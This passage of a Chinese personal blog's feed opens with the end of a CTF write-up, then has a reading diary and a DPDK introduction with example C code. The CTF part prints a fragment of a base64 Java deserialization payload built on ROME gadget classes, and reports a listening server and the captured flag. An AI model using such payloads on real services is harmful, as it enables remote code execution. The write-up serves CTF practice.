IAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmpxAH4ACXhwdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHEAfgAUc3IAKmNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLlRvU3RyaW5nQmVhbgn1jkoPI+4xAgACTAAKX2JlYW5DbGFzc3EAfgAcTAAEX2</span><br></pre></td></tr></table></figure><p>服务器启动监听端口</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/8.png" alt="8"></p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>获取flag</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/9.png" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;题目地址&quot;&gt;&lt;a href=&quot;#题目地址&quot; class=&quot;headerlink&quot; title=&quot;题目地址&quot;&gt;&lt;/a&gt;题目地址&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/challenge&quot; target=&quot;_blank&quot; r
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>读书分享I</title>
    <link href="elssm.github.io/2022/12/04/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABI/"/>
    <id>elssm.github.io/2022/12/04/读书分享I/</id>
    <published>2022-12-04T06:22:48.000Z</published>
    <updated>2022-12-14T06:01:36.945Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>研三上学期我的时间几乎每天被分成了几大块。睡觉吃饭、健身、读书、毕设、吉他，目的是让学生时代最后过的有意义些。健身时间我基本上固定到了每天中午的11:40到13:00，一周大概4天或者5天。读书我一般固定在周内的中午和晚上睡觉前，周末时间就不固定了。目前这种状态大概持续了3个月。正好做一个简单的阅读分享。</p><h4 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h4><ul><li>网络是怎样连接的（户根勤）</li></ul><p><img src="/2022/12/04/读书分享I/1.png" alt="1" style="zoom:50%;"></p><p>身为计算机专业的学生，经常被问到如下一个关于网络的问题。</p><p>面试官：我现在在浏览器里输入一个地址，请你简述一下从回车之后到响应发生的大概流程。</p><p>该书完美解答了这个问题，读完这本书，我相信对于面试官的这个问题至少可以回答40分钟。书中的配图也很详细很直观。</p><ul><li>1984（乔治奥威尔）</li></ul><p><img src="/2022/12/04/读书分享I/2.png" alt="2" style="zoom:50%;"></p><p><strong>战争即和平、自由即奴役、无知即力量。</strong></p><p>《1984》是一部杰出的政治寓言小说，也是一部幻想小说。作品刻画了人类在极权主义社会的生存状态，有若一个永不褪色的警示标签，警醒世人提防这种预想中的黑暗成为现实。历经几十年，其生命力益显强大，被誉为20世纪影响最为深远的文学经典之一。</p><p>如果生活像1984这样，那人生还有什么意义。温斯顿这样的人物，最终都被强制“驯化”了。这本书读到一半的时候我还以为奥伯良是个好人，没想到太坏了。我有理由相信奥伯良或许之前也是和温斯顿一样的想法，只不过奥伯良受到的“洗脑”更严重，从而导致他完成了从痛恨老大哥到崇拜老大哥的转变。真是细思极恐！</p><ul><li>局外人（加缪）</li></ul><p><img src="/2022/12/04/读书分享I/3.png" alt="3" style="zoom:50%;"></p><p><strong>人生在世，永远也不该演戏作假。</strong></p><p>《局外人》是法国作家加缪的成名作，同时也是存在主义文学的杰出作品之一，该书以一种客观记录式的“零度风格”，粗线条地描述了主人公默尔索在荒谬的世界中经历的种种荒谬的事，以及自身的荒诞体验。从参加母亲的葬礼到偶然成了杀人犯，再到被判处死刑，默尔索似乎对一切都无动于衷，他像一个象征性的符号，代表了一种普遍的存在，又像是一个血红色的灯塔，具有高度的警示性。然而，局外人现象的产生无疑是由这个世界本身所孕育的，默尔索的存在有其深刻的外部原因。</p><p>看完局外人后，我很欣赏默尔索这个人物，特立独行，不悲不喜。然而就是这样的一个性格，最后竟然成为了在法庭上被审判的点，我相信世界上像默尔索这样的人寥寥无几。对于他的遭遇我也感到惋惜。</p><ul><li>刀锋（毛姆）</li></ul><p><img src="/2022/12/04/读书分享I/4.png" alt="4" style="zoom:50%;"></p><p><strong>剃刀边缘无比锋利，欲通过者无不艰辛。是故智者常言，救赎之道难行。</strong></p><p>《刀锋》写一个参加第一次世界大战的美国青年飞行员拉里·达雷尔。在军队里，拉里结识了一个爱尔兰好友：这人平时是那样一个生龙活虎般的置生死于度外的飞行员，但在一次遭遇战中，因去救拉里而中弹牺牲。拉里因此对人生感到迷惘，弄不懂世界上为什么有恶和不幸，拉里开始了他令人匪夷所思的转变。</p><p>这本书中的人物刻画非常鲜明，例如艾略特舅舅、伊莎贝尔、布雷德利太太、拉里、格雷、苏菲、苏珊等。其实除了主人公拉里意外，其他人物都写的很好。艾略特，一辈子喜欢交际、喜欢人情世故。但是有一颗善良的心。刚开始看的时候我觉得这样的人活着属实有些累，但是看到最后，我逐渐理解了艾略特。伊莎贝尔，曾经是拉里的未婚妻，说实话书的前面我很欣赏伊莎贝尔，感觉这种女的真是不可多得。一般人都不能理解拉里，但是她却能够一直陪伴拉里。好家伙没想到后面反转了，陷害苏菲(当然苏菲也有自身原因)，之后我就不喜欢这个人物了。苏珊，我觉得活的很真实，也很清楚自己想要什么，当然苏珊的日子最后也过的很舒服。随遇而安就是最好的！</p><ul><li>人生（路遥）</li></ul><p><img src="/2022/12/04/读书分享I/5.png" alt="5" style="zoom:50%;"></p><p><strong>人生的道路虽然漫长，但紧要处常常只有几步，特别是当人年轻的时候。</strong></p><p>《人生》是路遥的一部中篇小说，发表于1982年，它以改革时期陕北高原的城乡生活为时空背景，叙述了高中毕业生高加林回到土地又离开土地，再回到土地这样人生的变化过程。高加林同农村姑娘刘巧珍、城市姑娘黄亚萍之间的感情纠葛构成了故事发展的矛盾，也正是体现那种艰难选择的悲剧。</p><p>对于高加林的遭遇我很共情，当一家三口得知高加林教师职位被撤去之后，我想到了自己当时得知自己考研复试被刷后的情形。吃不下去饭，看不进去书，听不进去话。浑浑噩噩过了两周，当时都想过二战，但是又没有足够的勇气与毅力，最终还是选择了调剂。对于高加林的意志我感到佩服，在农村那样的环境下，能够一直坚持，没有颓废下去。</p><p>但是我觉得高加林的欲望太大了。巧珍多好的姑娘，现在打灯笼都找不着！你高加林失落的时候是谁在陪你，你高加林锄地受伤的时候是谁给你抹的药，你高加林馒头卖不出去的时候是谁帮的你。你高加林倒好，为了自己的未来直接抛弃巧珍要和黄亚萍在一起。太年轻了，too young too simple！亚萍也是急，被爱情冲昏了头脑，我看人张克南就不错嘛。</p><ul><li>我的阿勒泰（李娟）</li></ul><p><img src="/2022/12/04/读书分享I/6.jpeg" alt="6" style="zoom:50%;"></p><p><strong>最安静与最孤独的成长，也是能使人踏实、自信、强大、善良的。大不了，吐吐舌头而已。</strong></p><p>李娟的散文成名作和代表作之一。原生态记录了作者在疆北阿勒泰地区生活的点点滴滴，包括人与事的记忆和感悟。全书文字明净，质地纯粹，原生态地再现了疆北风物人情，充满了朴野清新的气息。十年前，作者在到处收集来的纸片上用密密麻麻的文字写下她的生活和感悟，投稿到新疆的文艺期刊。一些资深的编辑认为一个二十岁左右的女孩不可能写出如此清新而有才华的作品。但新疆著名作家刘亮程将她挖掘出来，她的*部作品以《九篇雪》为名结集出版，人们才开始知道有个新疆女孩叫李娟。此后，她的散文在《南方周末》、《文汇报》陆续刊登，完全是天才的笔触，引起了文坛的震惊。人们很难想象：一个没有受过完整高等教育、阅读范围主要限于金庸、琼瑶、一直生活在疆北荒野之地的女孩，能够写出如此清新、活泼、充满灵性和生命力的文字。</p><p>书中讲述了一个一个的小故事，很善良很温馨。看完之后我发现李娟的童年很充实，卖货踩缝纫机摘蘑菇哈哈哈哈哈，希望后面有机会也能去新疆玩一玩！</p><ul><li>我与地坛（史铁生）</li></ul><p><img src="/2022/12/04/读书分享I/7.jpeg" alt="7" style="zoom:50%;"></p><p><strong>只要还能哭就还有救，只要还能哭就有哭够的时候。</strong></p><p>《我与地坛》由中国当代著名作家史铁生著。是史铁生文学作品中，充满哲思又极为人性化的代表作之一。其前第一段和第二段被纳入人民教育出版社的高一教材中。前两部分注重讲地坛和他与母亲的后悔，对于中学生来说，这是一篇令人反思的优秀文章。</p><p>史铁生的文笔真是太细腻了～～～</p><ul><li>都柏林人（詹姆斯乔伊斯）</li></ul><p><img src="/2022/12/04/读书分享I/8.png" alt="8" style="zoom:50%;"></p><p>《都柏林人》是詹姆斯·乔伊斯久负盛名的短篇小说集，称得上20世纪整个西方最著名的短篇小说集了。1914年出版，置景于二三十年代的都柏林，截取中下层人民生活的横断面，一个片刻一群人，十五个故事汇集起来，宛若一幅印象主义的绘画，笔触简练，错落成篇，浮现出苍凉世态，遥远、清冷，然而精致，是上上之品。</p><p>故事的构成很精心，应该都是些开放式的结尾吧，印象比较深刻的故事是母亲、两个浪汉和公寓。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;研三上学期我的时间几乎每天被分成了几大块。睡觉吃饭、健身、读书、毕设、吉他，目的是让学生时代最后过的有意义些。健身时间我基本上固定到了每天中
      
    
    </summary>
    
    
      <category term="随笔" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>DPDK初探</title>
    <link href="elssm.github.io/2022/10/10/DPDK%E5%88%9D%E6%8E%A2/"/>
    <id>elssm.github.io/2022/10/10/DPDK初探/</id>
    <published>2022-10-10T02:36:17.000Z</published>
    <updated>2022-10-10T02:58:22.796Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>什么是DPDK？对于用户，是性能出色的报数据处理加速软件库；对于开发者，是一个实践包处理新想法的创新工场；对于性能调优者，是一个绝佳的成果分享平台。DPDK对于当下火热的网络功能虚拟化而言是一个重要基石。</p><p>DPDK最初的动机很简单，就是证明IA多核处理器能够支撑高性能数据包处理。随着早期目标的达成和更多通用处理器体系的加入，DPDK逐渐成为通用多核处理器高性能数据包处理的业界标杆。</p><h4 id="主流包处理硬件平台"><a href="#主流包处理硬件平台" class="headerlink" title="主流包处理硬件平台"></a>主流包处理硬件平台</h4><p>支持包处理的主流硬件平台大致分为三个方向。</p><ul><li>硬件加速器：对于本身模块化的固化功能具有高性能低成本的特点</li><li>网络处理器：提供了包处理逻辑软件可编程的能力</li><li>多核处理器：在更为复杂多变的高层包处理上有优势</li></ul><h5 id="硬件加速器"><a href="#硬件加速器" class="headerlink" title="硬件加速器"></a>硬件加速器</h5><p>硬件加速器被广泛用于包处理领域，ASIC和FPGA是其最广为采用的器件。</p><p>ASIC：一种应特定用户要求和特定电子系统的需要而设计、制造的集成电路。ASIC的优点是面向特定用户的需求，在批量生产时与通用集成电路相比体积更小、功耗更低、可靠性更高、性能提高、保密性增强、成本降低等。但ASIC的缺点也很明显，它的灵活性和扩展性不够、开发费用高、开发周期长。</p><p>FPGA：现场可编程门阵列。作为ASIC领域中的一种半定制电路而出现，与ASIC的区别是用户不需要介入芯片的布局布线和工艺问题，而且可以随时改变其逻辑功能，使用灵活。FPGA以并行运算为主，开发相对于传统PC、单片机开发有很大不同。以硬件描述语言(Verilog或VHDL)来实现。</p><p>全可编程FPGA概念的提出，使FPGA朝着进一步软化的方向持续发展，其并行化整数运算的能力将进一步在通用计算定制化领域得到挖掘，近年来在数据中心中起的了很大进步，例如应用于机器学习场合。</p><h5 id="网络处理器"><a href="#网络处理器" class="headerlink" title="网络处理器"></a>网络处理器</h5><p>网络处理器是专门为处理数据包而设计的可编程通用处理器，采用多内核并行处理结构，其常被应用于通信领域的各种任务，比如包处理、协议分析、路由查找、声音/数据的汇聚、防火墙、QoS等。其通用性表现在执行逻辑由运行时加载的软件决定，用户使用专用指令集即微码(microcode)进行开发。其硬件体系结构大多采用高速的接口技术和总线规范，具有较高的I/O能力，使得包处理能力得到很大提升。</p><p>如下图是NP-5处理器架构框图，其中TOP部分是可编程部分，根据需要通过编写微码实现业务相关的包处理逻辑。NPU拥有高性能和高可编程性等优点。但其成本和特定领域的特性限制了它的市场规模。而不同厂商不同架构的NPU遵循的微码规范不尽相同，开发人员的成长以及生态系统的构建都比较困难。虽然一些NPU的微码也开始支持由高级语言(例如C)编译生成，但由于结构化语言本身原语并未面向包处理，使得转换后的效率并不理想。</p><p><img src="/2022/10/10/DPDK初探/1.png" alt="1"></p><h5 id="多核处理器"><a href="#多核处理器" class="headerlink" title="多核处理器"></a>多核处理器</h5><p>现代CPU性能的扩展主要通过多核的方式进行演进。这样利用通用处理器同样可以在一定程度上并行地处理网络负载。下图是Intel双路服务器平台框图，描述了一个典型的双路服务器平台的多个模块，CPU、芯片组C612、内存和以太网控制器XL710构成了主要的数据处理通道。基于PCIe总线的I/O接口提供了大量的系统接口，为服务器平台引入了差异化的设计。</p><p><img src="/2022/10/10/DPDK初探/2.png" alt="2"></p><p>当前的多核处理器也正在走向SoC化，针对网络的SoC往往集成内存控制器、网络控制器，甚至是一些硬件加速处理引擎。以下是一些主流厂商的多核处理器的SoC平台</p><ul><li>IA multi-core Xeon</li><li>Tilear-TILE-Gx</li><li>Cavium Network-OCTEON &amp; OCTEON II</li><li>Freescale-QorIQ</li><li>NetLogic Microsystem-XLP</li></ul><h4 id="初识DPDK"><a href="#初识DPDK" class="headerlink" title="初识DPDK"></a>初识DPDK</h4><p>以Linux为例，传统网络设备驱动包处理的动作可以概括如下：</p><ul><li>数据包到达网卡设备</li><li>网卡设备依据配置进行DMA操作</li><li>网卡发送中断，唤醒处理器</li><li>驱动软件填充读写缓冲区数据结构</li><li>数据报文到达内核协议栈，进行高层处理</li><li>如果最终应用在用户态，数据从内核搬移到用户态</li><li>如果最终应用在内核态，在内核继续进行</li></ul><p>随着网络接口带宽从千兆向万兆迈进，原先每个报文就会触发一个中断，中断带来的开销变得突出。大量数据到来会触发频繁的中断开销，导致系统无法承受，因此有人在Linux内核中引入了<code>NAPI</code>机制，其策略是系统被中断唤醒后，尽量使用轮询的方式一次处理多个数据包，直到网络再次空闲重新转入中断等待。</p><p>一个二层以太网包经过网络设备驱动的处理后，最终大多要交给用户态的应用。网络包进入计算机大多需要经过协议处理，在Linux系统中TCP/IP由Linux内核处理。即使在不需要协议处理的场景下，大多数场景也需要把包从内核的缓冲区复制到用户缓冲区，系统调用以及数据包复制的开销，会直接影响用户态应用从设备直接获得包的能力，而对于多样的网络功能节点来说，TCP/IP协议栈并不是数据转发节点所必需的。</p><p>如果再往使实时性方面考虑，传统上，事件从中断发生到应用感知，也是要经过长长的软件处理路径，所以在2010年前采用IA(Intel Architecture)处理器的用户会得出一个结论，就是IA不适合做包处理。</p><h4 id="DPDK最佳实践"><a href="#DPDK最佳实践" class="headerlink" title="DPDK最佳实践"></a>DPDK最佳实践</h4><p>现在，DPDK的出现很好的解答了IA多核处理器是否可以应对高性能数据包处理这一问题。</p><p>DPDK技术大致归纳如下：</p><ul><li>轮询：避免中断上下文切换的开销。</li><li>用户态驱动：既规避了不必要的内存拷贝又避免了系统调用。</li><li>亲和性与独占：DPDK虽然工作在用户态，但是线程的调度仍然依赖内核。利用线程的CPU亲和绑定的方式，特定任务可以被指定在某个核上工作。好处是可避免线程在不同核间频繁切换，核间线程切换容易导致因<code>cache miss</code>和<code>cache write back</code>造成的大量性能损失。</li><li>降低访存开销：利用内存大页能有效降低<code>TLB miss</code>，利用内存多通道的交错访问有效提高内存访问的有效带宽，利用对于内存非对称性的感知避免额外的访存延迟。</li><li>软件调优：结构的<code>cache line</code>对齐、数据在多核间访问避免跨<code>cache line</code>共享、适时地预取数据、多元数据批量操作等</li><li>利用IA新硬件技术：拿<code>Intel DDIO</code>技术来讲，这个cache子系统对DMA访存的硬件创新直接助推了性能跨越式的增长。有效利用SIMD（<code>Single Instruction Multiple Data</code>）并结合超标量技术（<code>Superscalar</code>）对数据层面或者对指令层面进行深度并行化，在性能的进一步提升上也行之有效。另外一些指令（比如<code>cmpxchg</code>），本身就是<code>lockless</code>数据结构的基石，而<code>crc32</code>指令对于<code>4 Byte Key</code>的哈希计算也是改善明显。</li><li>充分挖掘网卡的潜能：经过<code>DPDK I/O</code>加速的数据包通过<code>PCIe</code>网卡进入系统内存，<code>PCIe</code>外设到系统内存之间的带宽利用效率、数据传送方式（<code>coalesce</code>操作）等都是直接影响I/O性能的因素。在现代网卡中，往往还支持一些分流（如RSS，FDIR等）和卸载（如Chksum， TSO等）功能。DPDK充分利用这些硬件加速特性，帮助应用更好地获得直接的性能提升。</li></ul><h4 id="DPDK框架简介"><a href="#DPDK框架简介" class="headerlink" title="DPDK框架简介"></a>DPDK框架简介</h4><p>DPDK为IA上的高速包处理而设计。大量利用了有助于包处理的软硬件特性，如大页、缓存行对齐、线程绑定、预取、NUMA、IA最新指令的利用、Intel DDIO、内存交叉访问等。</p><ul><li><p>核心库 Core Libs，提供系统抽象、大页内存、缓存池、定时器及无锁环等基础组件。 </p></li><li><p>PMD 库，提供全用户态的驱动，以便通过轮询和线程绑定得到极高的网络吞吐，支持 各种本地和虚拟的网卡。</p></li><li><p>Classify 库，支持精确匹配（Exact Match）、最长匹配（LPM）和通配符匹配（ACL），提 供常用包处理的查表操作。 </p></li><li><p>QoS 库，提供网络服务质量相关组件，如限速（Meter）和调度（Sched）。</p></li></ul><p>下图为DPDK主要模块分解</p><p><img src="/2022/10/10/DPDK初探/3.png" alt="3"></p><p>除了这些组件，DPDK还提供了几个平台特性，比如节能考虑的运行时频率调整(POWER)、与Linux Kernel stack建立快速通道的KNI(Kernel Network Interface)。而Packet Framework和DISTRIB为搭建更复杂的多核流水线处理模型提供了基础的组件。</p><h4 id="解读数据包处理能力"><a href="#解读数据包处理能力" class="headerlink" title="解读数据包处理能力"></a>解读数据包处理能力</h4><p>以以太网为例，一般所说的接口带宽，1Gbit/s、10Gbit/s、25Gbit/s、40Gbit/s、 100Gbit/s，代表以太接口线路上所能承载的最高传输比特率，其单位是 bit/s（bit per second， 位 / 秒）。实际上，不可能每个比特都传输有效数据。以太网每个帧之间会有帧间距（InterPacket Gap，IPG），默认帧间距大小为12字节。每个帧还有7个字节的前导（Preamble），和1个字节的帧首定界符（Start Frame Delimiter，SFD）。具体帧格式如下图所示，有效内容主要是以太网的目的地址、源地址、以太网类型、负载。报文尾部是校验码。</p><p><img src="/2022/10/10/DPDK初探/4.png" alt="4"></p><p>通常意义上的满速带宽能跑有效数据的吞吐可以由如下公式得到理论帧转发率：</p><p>帧转发率 = BitRate/8 / IPG+Preamble+SFD+PKtSize</p><p>而这个最大理论帧转发率的倒数表示了线速情况下先后两个包到达的时间间隔</p><p>按照这个公式，将不同包长按照特定的速率计算可得到一个以太帧转发率，如下图所示，可以发现在相同带宽速率下，包长越小的包，转发率越高，帧间延迟也越小。</p><p><img src="/2022/10/10/DPDK初探/5.png" alt="5"></p><h4 id="软件包处理的潜力"><a href="#软件包处理的潜力" class="headerlink" title="软件包处理的潜力"></a>软件包处理的潜力</h4><h5 id="DPDK加速网络节点"><a href="#DPDK加速网络节点" class="headerlink" title="DPDK加速网络节点"></a>DPDK加速网络节点</h5><p>DPDK软件包内有一个最基本的三层转发实例(l3fwd)，可用于测试双路服务器整个系统的吞吐能力，实验表明可以达到 220Gbit/s 的数据报文吞吐能力。值得注意的是，除了通过 硬件或者软件提升性能之外，如今 DPDK 整系统报文吞吐能力上限已经不再受限于 CPU 的 核数，当前瓶颈在于 PCIe（IO 总线）的 LANE 数。换句话说，系统性能的整体 I/O 天花板不 再是 CPU，而是系统所提供的所有 PCIe LANE 的带宽，能插入多少个高速以太网接口卡。</p><p>在这样的性能基础上，网络节点的软化就成为可能。对于网络节点上运转的不同形态的网络功能，一旦软化并适配到一个通用的硬件平台，随之一个自然的诉求可能就是软硬件解耦。解耦正是网络功能虚拟化（NFV）的一个核心思想，而硬件解耦的多个网络功能在单一通用节点上的隔离共生问题，是另一个核心思想虚拟化诠释的。当然这个虚拟化是广义的， 在不同层面可以有不同的支撑技术。</p><p>NFV有很多诉求，业务面高性能，控制面高可用、高可靠、易运维、易管理等。但没有业务面的高性能，后续的便无从谈起。DPDK始终为高性能业务面提供坚实的支撑，除此以外，DPDK立足IA的CPU 虚拟化技术和IO的虚拟化技术，对各种通道做持续优化改进的同时，也对虚拟交换（vswitch）的转发面进化做出积极贡献。应对绝对高吞吐能力的要求，DPDK支持各种I/O的SR-IOV接口；应对高性能虚拟主机网络的要求，DPDK支持标准virtio接口；对虚拟化平台的支撑，DPDK从KVM、VMWARE、XEN的hypervisor到容器技术，可谓全平台覆盖。</p><h5 id="DPDK加速计算节点"><a href="#DPDK加速计算节点" class="headerlink" title="DPDK加速计算节点"></a>DPDK加速计算节点</h5><p>C10K是IT界的一个著名命题，甚至后续衍生出了关于C1M和C10M的讨论。其阐述 的一个核心问题就是，随着互联网发展，随着数据中心接口带宽不断提升，计算节点上各种互联网服务对于高并发下的高吞吐有着越来越高的要求。 </p><p>但是单一接口带宽的提高并不能直接导致高并发、高吞吐服务的发生，即使用到了一系列系统方法（异步非阻塞，线程等），但网络服务受限于内核协议栈多核水平扩展上的不足以及建立拆除连接的高开销，开始逐渐阻碍进一步高并发下高带宽的要求。另一方面，内核协议栈需要考虑更广泛的支持，并不能为特定的应用做特殊优化，一般只能使用系统参数进行调优。 当然，内核协议栈也在不断改进，而以应用为中心的趋势也会不断推动用户态协议栈的涌现。有基于BSD协议栈移植的，有基于多核模型重写的原型设计，也有将整个Linux内核包装成库的。它们大多支持以DPDK作为I/O引擎，有些也将DPDK的一些优化想法加入到协议栈的优化中，取得了比较好的效果。</p><h5 id="DPDK加速存储节点"><a href="#DPDK加速存储节点" class="headerlink" title="DPDK加速存储节点"></a>DPDK加速存储节点</h5><p>Intel最近开源了SPDK（Storage Performance Development Kit），一款存储加速开发套件，其主要的应用场景是iSCSI性能加速。目前iSCSI系统包括前端和后端两个部分，在前端，DPDK提供网络I/O加速，加上一套用户态TCP/IP协议栈（目前还不包含在开源包中），以流水线的工作方式支撑起基于iSCSI的应用；在后端，将DPDK用户态轮询驱动的方式实践在NVMe上，PMD的NVMe驱动加速了后端存储访问。这样一个端到端的整体方案，用数据证明了卓有成效的IOPS性能提升。</p><h5 id="DPDK方法论"><a href="#DPDK方法论" class="headerlink" title="DPDK方法论"></a>DPDK方法论</h5><ul><li>专用负载下的针对性软件优化</li><li>追求可水平扩展的性能</li><li>向Cache索求极致的实现优化性能</li></ul><h4 id="DPDK安装"><a href="#DPDK安装" class="headerlink" title="DPDK安装"></a>DPDK安装</h4><p>Todo</p><h4 id="DPDK实例"><a href="#DPDK实例" class="headerlink" title="DPDK实例"></a>DPDK实例</h4><p>在对DPDK的原理和代码展开进一步解析之前，先看一些小而简单的例子，建立一个形象上的认知。</p><ul><li>helloworld：启动基础运行环境，DPDK构建了一个基于操作系统的，但适合包处理的软件运行环境，你可以认为这是个mini-OS</li><li>skeleton：最精简的单核报文收发骨架</li><li>l3fwd：三层转发是DPDK用于发布性能测试指标的主要应用</li></ul><h5 id="Helloworld"><a href="#Helloworld" class="headerlink" title="Helloworld"></a>Helloworld</h5><p>DPDK里的helloworld是最基础的入门程序。它建立了一个多核运行的基础环境，每个线程会打印<code>hello from core #</code>，其中<code>core #</code>是由操作系统管理的。</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: BSD-3-Clause</span></span><br><span class="line"><span class="comment"> * Copyright(c) 2010-2014 Intel Corporation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/queue.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_launch.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_eal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_per_lcore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_lcore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_debug.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Launch a function on lcore. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">lcore_hello(__rte_unused <span class="keyword">void</span> *arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> lcore_id;</span><br><span class="line">lcore_id = rte_lcore_id();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello from core %u\n"</span>, lcore_id);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &gt;8 End of launching function on lcore. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initialization of Environment Abstraction Layer (EAL). 8&lt; */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">unsigned</span> lcore_id;</span><br><span class="line"></span><br><span class="line">ret = rte_eal_init(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">rte_panic(<span class="string">"Cannot init EAL\n"</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of initialization of Environment Abstraction Layer */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Launches the function on each lcore. 8&lt; */</span></span><br><span class="line">RTE_LCORE_FOREACH_WORKER(lcore_id) &#123;</span><br><span class="line"><span class="comment">/* Simpler equivalent. 8&lt; */</span></span><br><span class="line">rte_eal_remote_launch(lcore_hello, <span class="literal">NULL</span>, lcore_id);</span><br><span class="line"><span class="comment">/* &gt;8 End of simpler equivalent. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* call it on main lcore too */</span></span><br><span class="line">lcore_hello(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of launching the function on each lcore. */</span></span><br><span class="line"></span><br><span class="line">rte_eal_mp_wait_lcore();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* clean up the EAL */</span></span><br><span class="line">rte_eal_cleanup();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码角度，<code>rte</code>是指<code>runtime environment</code>，<code>eal</code>是指<code>environment abstraction layer</code>。DPDK的主要对外函数接口都是以<code>rte_</code>作为前缀，抽象化函数接口可以帮助DPDK运行在多个操作系统上。</p><h6 id="初始化基础运行环境"><a href="#初始化基础运行环境" class="headerlink" title="初始化基础运行环境"></a>初始化基础运行环境</h6><p>主线程运行入口是<code>main</code>函数，调用了<code>rte_eal_init</code>入口函数，启动基础运行环境。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eal_init</span><span class="params">(<span 